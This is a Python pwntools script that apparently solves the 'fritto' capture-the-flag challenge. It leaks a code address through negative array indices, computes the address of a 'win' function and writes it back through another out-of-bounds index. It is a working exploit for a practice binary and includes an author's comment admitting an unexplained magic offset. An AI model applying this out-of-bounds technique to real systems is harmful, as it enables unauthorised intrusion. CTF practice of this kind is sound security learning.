#!/usr/bin/env python3
from pwn import remote, args, p64, ELF, gdb

e = ELF("./fritto")

if args.REMOTE:
    r = remote("fritto-disordinato.challs.olicyber.it", 33001)
else:
    r = gdb.debug('./fritto', """
    b *store_num
    continue
    """)

n1, n2 = 0, 0
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvline()
r.sendline(b'-9')
r.recvuntil(b': ')
n1 = int(r.recvline().strip().decode())
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvline()
r.sendline(b'-10')
r.recvuntil(b': ')
n2 = int(r.recvline().strip().decode())
addrMain = (n1 << 32) | (n2 & (1<<32)-1)
print(addrMain)
e.address = addrMain - e.symbols['main'] - 241 # idk but its broken
print(hex(e.sym['win']))
r.recvuntil(b'> ')
r.sendline(b'0')
r.recvline()
r.sendline(b'-10')
r.recvline()
r.sendline(str(e.sym["win"] & ((1<<32)-1)).encode())
r.interactive()